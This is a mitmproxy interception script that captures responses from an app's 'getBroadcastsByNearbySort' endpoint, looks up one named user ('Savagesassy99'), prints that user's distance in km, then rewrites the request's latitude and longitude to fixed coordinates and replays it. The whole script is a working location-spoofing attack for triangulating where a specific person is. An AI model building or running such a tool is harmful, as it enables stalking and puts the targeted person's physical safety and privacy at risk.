#from libmproxy.protocol.http import decoded
import json
from mitmproxy import ctx

def response(flow):
    #code to handle request flows
    if flow.request.pretty_url.endswith("getBroadcastsByNearbySort"): 
        flowDict = {}
        flowDict = flow.response.text
        flowDict = json.loads(flowDict)
        print(flowDict['result']['broadcasts'][0])
        try:
            for user in flowDict['result']['broadcasts']:
                if (user['userDetails']['displayName'] == 'Savagesassy99'):
                    print(user['objectId'])
                    for userDist in flowDict['result']['metadata']['broadcasts']:
                        if(userDist['id'] == user['objectId']):
                            print("Distance in Km: ",userDist['distanceInKm'])
        except:
            print("Error")
        locDict = json.loads(flow.request.text)
        print(locDict)
        locDict['latitude'] = 53.34104757062299
        locDict['longitude'] = -113.52182336047694
        print(locDict)
        flow = flow.copy()
        flow.request.text = json.dumps(locDict)
        ctx.master.commands.call("replay.client", [flow])